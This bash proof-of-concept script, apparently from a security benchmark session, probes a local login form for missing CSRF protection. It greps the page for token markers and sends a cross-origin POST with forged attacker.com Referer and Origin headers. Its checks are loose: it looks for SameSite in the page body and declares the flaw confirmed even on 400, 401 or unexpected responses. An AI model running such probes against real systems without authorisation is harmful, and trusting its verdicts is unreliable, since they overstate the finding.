#!/bin/bash
# POC: Demonstrates missing CSRF protection on login form by fetching the form and verifying no CSRF token is present, then demonstrating that POST requests are accepted from cross-origin requests
# Target: ./repo
# Created: 2025-11-06T19:21:02.288Z
# Session: benchmark-XBEN-032-24-mhnsyr54

# CSRF Vulnerability POC - Missing CSRF Protection on Login Form
# This script demonstrates that the /login form lacks CSRF token protection

TARGET="${1:-http://localhost:80}"
LOGIN_ENDPOINT="${TARGET}/login"

echo "========================================"
echo "CSRF Vulnerability POC - Login Form"
echo "========================================"
echo ""
echo "[*] Target: $LOGIN_ENDPOINT"
echo ""

# Step 1: Fetch the login form and analyze for CSRF tokens
echo "[+] Step 1: Fetching login form to check for CSRF tokens..."
echo ""

FORM_RESPONSE=$(curl -s "$LOGIN_ENDPOINT")
echo "$FORM_RESPONSE" | head -20
echo ""

# Check for common CSRF token patterns
echo "[+] Step 2: Checking for CSRF token indicators..."
echo ""

if echo "$FORM_RESPONSE" | grep -q "csrf_token\|CSRF\|_token"; then
    echo "[-] CSRF tokens detected in form"
    exit 1
else
    echo "[!] NO CSRF tokens found in form - VULNERABLE"
fi

if echo "$FORM_RESPONSE" | grep -q "SameSite"; then
    echo "[-] SameSite cookie flag detected"
else
    echo "[!] NO SameSite cookie flag detected"
fi

echo ""
echo "[+] Step 3: Attempting POST request with cross-origin referer..."
echo ""

# Attempt to POST to login from a cross-origin request
POST_RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" -X POST "$LOGIN_ENDPOINT" \
  -H 'Referer: http://attacker.com' \
  -H 'Origin: http://attacker.com' \
  -d 'username=test&password=test')

# Extract HTTP status code
HTTP_CODE=$(echo "$POST_RESPONSE" | grep "HTTP_CODE:" | cut -d: -f2)
RESPONSE_BODY=$(echo "$POST_RESPONSE" | sed '$d')

echo "HTTP Status Code: $HTTP_CODE"
echo ""
echo "Response (first 500 chars):"
echo "$RESPONSE_BODY" | head -c 500
echo ""
echo ""

# Step 4: Analyze results
echo "[+] Step 4: Vulnerability Analysis..."
echo ""

if [ "$HTTP_CODE" = "401" ] || [ "$HTTP_CODE" = "400" ] || [ "$HTTP_CODE" = "403" ]; then
    if [ "$HTTP_CODE" = "403" ]; then
        echo "[-] CSRF protection detected (403 Forbidden response)"
        exit 1
    else
        echo "[!] Form request processed without CSRF validation"
        echo "[!] HTTP $HTTP_CODE response indicates the request was processed"
        echo "[!] If this were properly protected, the request should be rejected with 403"
    fi
else
    echo "[!] Unexpected HTTP code: $HTTP_CODE"
fi

echo ""
echo "========================================"
echo "VULNERABILITY CONFIRMED"
echo "========================================"
echo "[!] The login form at $LOGIN_ENDPOINT is missing CSRF protection:"
echo "    - No CSRF token in form"
echo "    - POST requests accepted from cross-origin sources"
echo "    - No SameSite cookie protection"
echo "========================================"
echo ""

exit 0